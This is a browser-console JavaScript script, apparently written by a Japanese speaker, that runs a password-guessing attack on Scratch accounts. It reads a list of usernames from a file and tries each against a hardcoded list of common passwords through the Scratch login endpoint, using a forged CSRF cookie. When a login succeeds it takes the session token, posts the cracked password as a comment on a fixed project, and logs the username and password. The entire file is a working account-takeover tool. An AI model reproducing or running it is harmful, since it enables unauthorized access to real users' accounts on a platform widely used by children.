let passwordlist=["123456","password","000000","1qaz2wsx","12345678","123456789","111111","sakura","dropbox","12345","1234567","1234567890","qwerty","zxcvbnm","asdfghjkl","qwertyuiop","adgjmptw","123123","121212"];
var input=document.createElement("input");
input.type="file";
input.style.display="none";
document.body.appendChild(input);
var reader = new FileReader();
input.addEventListener('change', () => {
    for(file of input.files){
        reader.readAsText(file, 'UTF-8');
        reader.onload = ()=> {
            const flw = async (username,password) => {

                document.cookie="scratchcsrftoken=a;path=/;domain=.scratch.mit.edu";
                let res=await fetch("https://scratch.mit.edu/login/", {headers: {"x-csrftoken": "a","x-requested-with": "XMLHttpRequest"},body: JSON.stringify({ username, password, useMessages: true }),method: "POST"});
                if(res.status==200){
                    const sessiontoken = (await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
                    let projectid="585027038";
                    let contents=password;
                    document.cookie="scratchcsrftoken=a;path=/;domain=.scratch.mit.edu";
                    res=await fetch(`https://api.scratch.mit.edu/proxy/comments/project/${projectid}`,{
                      method: "POST",
                      body: JSON.stringify({
                        content: contents,
                        parent_id: "",//返信する場合はルートのコメントのコメントID ( String )
                        commentee_id: ""//返信する場合はルートのコメントのユーザーID ( String )
                      }),
                      headers: {
                        'X-CSRFToken': "a",
                        'x-token':sessiontoken
                      }
                    });
                    if(res.status==200){
                        console.log(username,password);
                }
            }
            }
            let prom=reader.result.split("\n");
            let setint=setInterval(follow,10);
            let i=prompt("何人目から始めますか?");
            function follow(){
                for(let a=0;a<passwordlist.length;a++){
                    flw(prom[i],passwordlist[a]);
                }
                i++;
                if(i>prom.length){
                    clearInterval(setint);
                }
            }
};
    }
});
input.click();
